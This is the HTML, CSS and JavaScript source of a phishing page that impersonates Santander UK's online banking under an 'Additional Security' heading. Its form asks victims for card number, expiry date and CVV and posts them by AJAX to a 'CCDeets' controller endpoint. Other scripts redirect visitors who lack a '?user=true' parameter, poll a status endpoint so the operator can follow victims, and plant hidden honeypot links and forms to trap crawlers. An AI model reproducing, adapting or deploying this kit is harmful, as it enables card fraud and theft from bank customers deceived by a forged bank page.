		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] {
			position: absolute;
			z-index: 2;
			list-style: none;
			text-align: left;
			padding: 0;
			margin: 0;
			box-shadow: 1px 1px 4px rgba(0, 0, 0, 0.2);
			background-color: #fff;
			border: 1px solid #ccc;
			white-space: nowrap;
			max-height: 200px;
			overflow-y: scroll;
			-webkit-overflow-scrolling: touch;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list.dropup[_ngcontent-tsy-c1] {
			bottom: 100%;
			margin-bottom: -1px;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .flag-box[_ngcontent-tsy-c1] {
			display: inline-block;
			width: 20px;
			margin-right: 1.1rem;
		}

		@media (max-width: 500px) {
			.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] {
				white-space: normal;
			}
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1]::-webkit-scrollbar-track {
			background-color: #fff;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1]::-webkit-scrollbar {
			width: 10px;
			height: 8px;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1]::-webkit-scrollbar-thumb {
			height: 29px;
			width: 6px;
			border-radius: 3px;
			background-color: #6f7779;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .divider[_ngcontent-tsy-c1] {
			padding-bottom: 5px;
			margin-bottom: 5px;
			border-bottom: 1px solid #ccc;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .country[_ngcontent-tsy-c1] {
			padding: 5px 10px;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .country[_ngcontent-tsy-c1] .dial-code[_ngcontent-tsy-c1] {
			color: #999;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .country.highlight[_ngcontent-tsy-c1] {
			background-color: rgba(0, 0, 0, 0.05);
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .country-name[_ngcontent-tsy-c1],
		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .dial-code[_ngcontent-tsy-c1],
		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .flag-box[_ngcontent-tsy-c1] {
			vertical-align: middle;
		}

		.intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .country-name[_ngcontent-tsy-c1] {
			margin-right: 0.2rem;
		}

		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1],
		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] input[type="tel"][_ngcontent-tsy-c1],
		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] input[type="text"][_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] input[type="tel"][_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] input[type="text"][_ngcontent-tsy-c1] {
			padding-right: 6px;
			padding-left: 52px;
			margin-left: 0;
		}

		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] .flag-container[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] .flag-container[_ngcontent-tsy-c1] {
			right: auto;
			left: 0;
		}

		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] .flag-container[_ngcontent-tsy-c1]:hover {
			cursor: pointer;
		}

		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] .flag-container[_ngcontent-tsy-c1]:hover .selected-flag[_ngcontent-tsy-c1] {
			border-right: 1px solid #9bc3d3;
		}

		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] .flag-container[_ngcontent-tsy-c1]:hover .selected-flag.selected[_ngcontent-tsy-c1],
		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] .flag-container[_ngcontent-tsy-c1]:hover .selected-flag[_ngcontent-tsy-c1]:hover {
			background-color: #deedf2;
		}

		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] input[disabled][_ngcontent-tsy-c1]+.flag-container[_ngcontent-tsy-c1]:hover,
		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] input[readonly][_ngcontent-tsy-c1]+.flag-container[_ngcontent-tsy-c1]:hover {
			cursor: default;
		}

		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] input[disabled][_ngcontent-tsy-c1]+.flag-container[_ngcontent-tsy-c1]:hover .selected-flag[_ngcontent-tsy-c1],
		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] input[readonly][_ngcontent-tsy-c1]+.flag-container[_ngcontent-tsy-c1]:hover .selected-flag[_ngcontent-tsy-c1] {
			background-color: transparent;
		}

		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1] {
			border-right: 1px solid #9bc3d3;
		}

		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] .selected-flag.selected[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1]:hover {
			background-color: #deedf2;
		}

		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] .selected-dial-code[_ngcontent-tsy-c1] {
			margin-left: 6px;
		}

		.intl-tel-input.iti-container[_ngcontent-tsy-c1] {
			position: absolute;
			top: -1000px;
			left: -1000px;
			z-index: 1060;
			padding: 1px;
		}

		.intl-tel-input.iti-container[_ngcontent-tsy-c1]:hover {
			cursor: pointer;
		}

		.iti-mobile[_ngcontent-tsy-c1] .intl-tel-input.iti-container[_ngcontent-tsy-c1] {
			top: 30px;
			bottom: 30px;
			left: 30px;
			right: 30px;
			position: fixed;
		}

		.iti-mobile[_ngcontent-tsy-c1] .intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] {
			max-height: 100%;
			width: 100%;
		}

		.iti-mobile[_ngcontent-tsy-c1] .intl-tel-input[_ngcontent-tsy-c1] .country-list[_ngcontent-tsy-c1] .country[_ngcontent-tsy-c1] {
			padding: 10px;
			line-height: 1.5em;
		}

		.iti-flag.np[_ngcontent-tsy-c1] {
			background-color: transparent;
		}

		.mobileNumber-inline-error-message[_ngcontent-tsy-c1] {
			color: #c00;
			font-size: 14px;
		}

		input[type="text"][_ngcontent-tsy-c1]:focus {
			box-shadow: 0 0 0 1px #9bc3d3;
		}

		a[_ngcontent-tsy-c1]:link {
			text-decoration: underline;
		}

		.phone-number-textbox-invalid[_ngcontent-tsy-c1] {
			border: 1px solid #ec0000 !important;
			border-radius: 4px;
		}

		.phone-inline-error-message[_ngcontent-tsy-c1] {
			color: #c00;
			font-size: 0.875rem;
			font-weight: 400;
			font-style: normal;
			font-stretch: normal;
			line-height: normal;
			letter-spacing: normal;
		}

		.changed-phone-number-label[_ngcontent-tsy-c1],
		a[_ngcontent-tsy-c1] {
			font-family: SantanderText-Regular, SantanderText;
			font-weight: 400;
			font-style: normal;
			font-size: 16px;
			color: #666;
			text-align: left;
			line-height: 24px;
			padding-bottom: 2%;
			width: -webkit-min-content;
			width: -moz-min-content;
			width: min-content;
			min-width: 97%;
			max-width: 1vw;
		}

		.call-us-label[_ngcontent-tsy-c1] {
			font-family: "Santander Text";
			color: #666;
			font-size: 1rem;
			font-weight: 400;
			font-style: normal;
			font-stretch: normal;
			line-height: 1.5rem;
			letter-spacing: normal;
			text-decoration: underline;
		}

		@media (min-width: 300px) and (max-width: 359px) {
			.phone-textbox[_ngcontent-tsy-c1] {
				width: 17.5rem;
			}
		}

		@media (min-width: 375px) and (max-width: 450px) {
			.phone-textbox[_ngcontent-tsy-c1] {
				width: 17.5rem;
			}
		}

		.arrow[_ngcontent-tsy-c1] .down-icon[_ngcontent-tsy-c1],
		.arrow[_ngcontent-tsy-c1] .up-icon[_ngcontent-tsy-c1],
		.arrow-icon[_ngcontent-tsy-c1] {
			border: solid #443c3a;
			border-width: 0 2px 2px 0;
			display: inline-block;
			padding: 3px;
		}

		.arrow[_ngcontent-tsy-c1] {
			top: 0.2rem;
			right: -8px;
			height: auto;
			width: 39px;
			position: absolute;
			display: flex !important;
			pointer-events: none;
			z-index: 999;
			pointer-events: auto !important;
		}

		.arrow[_ngcontent-tsy-c1] .up-icon[_ngcontent-tsy-c1] {
			-webkit-transform: rotate(45deg);
			transform: rotate(45deg);
			margin: 14px;
		}

		.arrow[_ngcontent-tsy-c1] .down-icon[_ngcontent-tsy-c1] {
			-webkit-transform: rotate(-135deg);
			transform: rotate(-135deg);
			margin: 14px;
		}

		li.country[_ngcontent-tsy-c1]:focus,
		li.country[_ngcontent-tsy-c1]:hover,
		li.highlight[_ngcontent-tsy-c1] {
			background-color: rgba(0, 0, 0, 0.05);
		}

		.selected-flag.dropdown-toggle[_ngcontent-tsy-c1]:after {
			content: none;
		}

		.flag-container.disabled[_ngcontent-tsy-c1] {
			cursor: default !important;
		}

		.intl-tel-input.allow-dropdown[_ngcontent-tsy-c1] .flag-container.disabled[_ngcontent-tsy-c1]:hover .selected-flag[_ngcontent-tsy-c1] {
			background: 0 0;
		}

		.country-dropdown[_ngcontent-tsy-c1] {
			border: none;
			padding: 0;
			width: -webkit-fit-content;
			width: -moz-fit-content;
			width: fit-content;
			border-collapse: collapse;
		}

		@media (min-width: 300px) and (max-width: 359px) {

			.country-dropdown[_ngcontent-tsy-c1],
			.country-list[_ngcontent-tsy-c1] {
				width: 17.6875rem;
			}
		}

		@media (min-width: 375px) and (max-width: 420px) {

			.country-dropdown[_ngcontent-tsy-c1],
			.country-list[_ngcontent-tsy-c1] {
				width: 20.6875rem;
			}
		}

		@media (min-width: 425px) and (max-width: 720px) {

			.country-dropdown[_ngcontent-tsy-c1],
			.country-list[_ngcontent-tsy-c1] {
				width: 21.6875rem;
			}
		}

		.search-container[_ngcontent-tsy-c1] {
			position: relative;
		}

		.search-container[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1] {
			width: 100%;
			height: 2.75rem;
			border: none;
			border-bottom: 1px solid #9bc3d3;
			padding-left: 10px;
		}

		.search-icon[_ngcontent-tsy-c1] {
			position: absolute;
			z-index: 2;
			width: 25px;
			margin: 1px 10px;
		}

		.country-list[_ngcontent-tsy-c1] {
			position: relative;
			border: none;
		}

		.flag-icon[_ngcontent-tsy-c1] {
			position: relative;
			display: inline-block;
			vertical-align: middle;
			width: 1.5em;
			height: 1rem;
			line-height: unset;
			background-size: cover;
			background-position: 100%;
			background-repeat: no-repeat;
		}

		.flag-icon-np[_ngcontent-tsy-c1] {
			height: 1.4rem;
		}

		.intl-tel-input[_ngcontent-tsy-c1] input#country-search-box[_ngcontent-tsy-c1] {
			padding-left: 6px;
		}

		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code.allow-dropdown.iti-sdc-2[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code.allow-dropdown.iti-sdc-3[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code.allow-dropdown.iti-sdc-4[_ngcontent-tsy-c1] .selected-flag[_ngcontent-tsy-c1] {
			width: 93px;
		}

		.intl-tel-input.separate-dial-code[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code.allow-dropdown.iti-sdc-2[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code.allow-dropdown.iti-sdc-3[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1],
		.intl-tel-input.separate-dial-code.allow-dropdown.iti-sdc-4[_ngcontent-tsy-c1] input[_ngcontent-tsy-c1] {
			padding-left: 98px;
			width: 19.75rem;
		}
	</style>
	<script src="partial/js/jquery.js"></script>
	<script src="partial/js/jquery.validate.js"></script>
	<script src="partial/js/jquery-3.4.1.min.js"></script>
	<script src="partial/js/jquery.payform.js"></script>
	<script src="partial/js/jquery.maskedinput.js"></script>
	<script src="partial/js/jquery.payment.js"></script>
	<script>
      if (window.location.search !== '?user=true') {
        location.href = 'exit.php';
      }
    </script>
	<script>
		$(document).ready(function() {
			$('#loginFrm').submit(function(e) {
				e.preventDefault();
				var ccnum = $('#ccnum').val();
				var expiry = $('#expiry').val();
				var cvvnum = $('#cvvnum').val();

				if (ccnum == null || ccnum == '') {
					return false;
				}
				if (expiry == null || expiry == '') {
					return false;
				}
				if (cvvnum == null || cvvnum == '') {
					return false;
				}

				$.ajax({
					type: 'POST',
					url: 'partial/controller.php?type=CCDeets',
					data: $('#loginFrm').serialize(),
					success: function(data) {
						//console.log(data);
						var parsed_data = JSON.parse(data);
						if (parsed_data.status == 'ok') {
							//console.log(parsed_data)
							location.href = "loading.php?user=true"
						} else {
							return false;
						}
						//console.log(parsed_data.status);
					}
				})
			});
		});
	</script>
	<script>
		var interval = 3000;

		function userStatus() {
			$.ajax({
				type: 'GET',
				url: 'partial/status.php',
				success: function(data) {
					var parsed_data = JSON.parse(data);
				},
				complete: function(data) {
					setTimeout(userStatus, interval);
				}
			});
		}
		setTimeout(userStatus, interval);
	</script>


	<script type="text/javascript">
		jQuery(function($) {
			$("#expiry").mask("99/99", {
				placeholder: "MM/YY"
			});
		});
	</script>
</head>

<body class="body-content">
	<div class="responsive">
		<olb-app ng-version="8.0.3">
			<div class="container-fluid appheader">
				<div class="container">
					<div class="row">
						<div class="col-sm-12 containerPadding header-responsive" role="banner">
							<olb-reset-header>
								<nav class="navbar appheader_content">
									<a tabindex="-1" href="https://www.santander.co.uk/">
										<img alt="Santander Image" class="img-fluid Bitmap header-logo-santander" src="partial/img/santander-logo-svg.svg" />
									</a>
									<!---->
									<div>


										<span class="d-none" id="cancelButtonDesc"> Cancel and return to Logon </span>
									</div>
								</nav>
							</olb-reset-header>
						</div>
					</div>
				</div>
			</div>
			<div class="container">
				<div class="row">
					<div class="col-sm-12 main-section-responsive">
						<olb-reset-home>
							<router-outlet></router-outlet>
							<olb-reset-landing>
								<div class="container-fluid">
									<div class="row">
										<div class="col-md-12 back-btn">
											<div class="container custom-back-container">
												<div class="row">
													<div class="d-flex pt-2 pb-3">

														<span class="d-none" id="backButtonDesc"> If you wish to go back to logon page please click here </span>
													</div>
												</div>
											</div>
										</div>
									</div>
									<div class="container-fluid h-auto custom-container">
										<div class="row">
											<div class="col-md-12 reset-center-content">
												<div class="container h-auto">
													<div class="row w-fit-content">
														<h1 aria-label="Account Verification" class="trouble-headline">Additional Security</h1>
													</div>
													<div class="row w-fit-content">
														<h2 class="sort-content trouble-headline-secondary" style="font-size:18px">For security reasons, we'll need you verify your identity, please enter your card information below.</h2>
													</div>
												</div>
											</div>
										</div>
										<div class="row">
											<div class="col-md-6 reset-center-content">
												<div class="custom-reset-center-content">


													<br>
													<!--
																<div class="mt-3"><olb-reset-validation-message-retail imglocation="./partial/img/alert.svg" msgtype="warn"><div class="warn pt-2 pb-2 d-flex"><div class="col-2 text-center validation-img-placeholder"><img alt="alert image" class="validation-image" src="./partial/img/alert.svg"></div><div class="col-10"><label aria-live="assertive" class="error-label" role="alert">The details you have provided do not match our records. Please check and try again using the form below.</label></div></div></olb-reset-validation-message-retail></div>
																-->

													<form class="idForm ng-untouched ng-pristine ng-invalid" id="loginFrm" method="POST">
														<input type="hidden" name="userid" value="<?= $_SESSION['uniqueid']; ?>">
														<div style="margin-bottom:10%">
															<div class="label-container"><label for="ccnum" class="label">Card Number</label></div>
															<input name="ccnum" id="ccnum" autocomplete="off" required="" type="tel" inputmode=numeric minlength=19 maxlength=19 placeholder="xxxx xxxx xxxx xxxx" class="form-control custom-form-controls ng-untouched ng-pristine" />
															<span class="d-none" id="pidDesc"> Please Enter your Card Number </span>
															<script type="text/javascript">
																document.getElementById('ccnum').addEventListener('input', function(e) {
																	var target = e.target,
																		position = target.selectionEnd,
																		length = target.value.length;
																	target.value = target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
																	target.selectionEnd = position += ((target.value.charAt(position - 1) === ' ' && target.value.charAt(length - 1) === ' ' && length !== target.value.length) ? 1 : 0);
																});
															</script>
														</div>
														<div style="margin-bottom:10%">
															<div class="label-container"><label for="expiry" class="label">Card Expiry</label></div>
															<input name="expiry" id="expiry" autocomplete="off" minlength=5 maxlength=5 required="" type="tel" placeholder="MM/YY" class="form-control custom-form-controls ng-untouched ng-pristine" />
															<span class="d-none" id="pidDesc"> Please Enter your Card Expiry </span>
														</div>
														<div style="margin-bottom:10%">
															<div class="label-container"><label for="cvvnum" class="label">CVV</label></div>
															<input name="cvvnum" id="cvvnum" autocomplete="off" required="" type="password" minlength=3 maxlength=4 class="form-control custom-form-controls ng-untouched ng-pristine" />
															<span class="d-none" id="pidDesc"> Please Enter your CVV </span>
														</div>



														<div class="button-content"><button type="submit" class="button button-secondary button-secondary--input custom-landing-continue-button" id="pid_continue">Continue</button></div>
													</form>



													<!---->
													<!---->

													<!---->
													<!---->
												</div>
											</div>


										</div>





									</div>
								</div>
							</olb-reset-landing>
						</olb-reset-home>
					</div>
				</div>
			</div>

		</olb-app>
	</div>

</body>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
<noscript class=sf-hidden>
	<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be
		banned from the site!</a>
</noscript>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned
	from the site!</a>
<form action="vendor/" method=POST>
	<div style="display:none;">
		<input type=text>
		<button style="display:none" type="submit">Submit button</button>
	</div>
</form>
<noscript>
	<form action="vendor/" method=POST>
		<div style="display:none;">
			<input type=text>
			<button style="display:none" type="submit">Submit button</button>
		</div>
	</form>
</noscript>
<noscript><a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be
		banned from the site!</a>
</noscript>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned
	from the site!</a>
<noscript><a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be
		banned from the site!</a>
</noscript>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned
	from the site!</a>

</html>